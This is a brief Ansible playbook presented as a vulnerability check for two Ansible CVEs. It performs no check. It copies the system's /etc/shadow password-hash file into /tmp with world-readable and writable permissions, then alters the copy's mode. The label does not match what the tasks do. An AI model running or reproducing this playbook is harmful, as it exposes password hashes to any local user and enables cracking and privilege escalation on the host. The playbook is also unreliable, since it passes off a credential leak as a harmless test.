
---
- name: CVE-2020-10744 and CVE-2020-1733 Vulnerability Check
  hosts: localhost
  gather_facts: no

  vars:
    file_path: /etc/shadow

  tasks:
    - name: Copy Shadow File
      copy:
        src: "{{file_path}}"
        dest: "/tmp"
        mode: 0666

    - name: Modify Shadow File Permissions
      file:
        path: "/tmp/shadow"
        mode: 0244
